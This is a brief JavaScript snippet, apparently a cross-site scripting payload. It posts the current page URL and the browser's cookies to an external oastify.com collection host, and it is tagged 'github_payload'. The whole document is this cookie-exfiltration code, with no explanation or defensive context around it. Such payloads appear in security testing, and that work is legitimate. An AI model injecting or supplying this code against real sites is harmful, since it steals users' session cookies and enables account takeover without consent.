fetch('https://wyyj5imoxv7w3td2jx0qztindej57vvk.oastify.com', {
  method: 'POST',
  body: JSON.stringify({
    url: window.location.href,
    cookies: document.cookie,
    payload: 'github_payload'
  })
})
